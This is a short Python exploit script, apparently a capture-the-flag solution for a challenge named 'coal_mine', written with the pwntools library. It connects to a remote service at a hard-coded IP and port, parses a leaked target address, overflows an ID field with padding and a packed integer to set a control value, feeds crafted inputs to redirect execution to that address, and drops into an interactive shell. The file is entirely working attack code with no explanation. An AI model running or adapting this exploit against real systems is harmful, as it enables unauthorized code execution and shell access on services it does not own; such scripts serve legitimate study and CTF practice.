from pwn import *
from ctypes import *
import time

r=remote('1.209.148.228',1337)
#r=process('coal_mine')

r.recvuntil('GOAL(')
shell=int(r.recvuntil(')').replace(')',''),16)
log.info(shell)

r.sendlineafter('ID :','A'*16+p32(26))#set v4 = 26
r.sendlineafter(' :','+')
for i in range(23):
	r.sendlineafter(' : ','+')
r.sendlineafter(' : ',str(shell))
r.sendlineafter(' : ',str(shell))
r.interactive()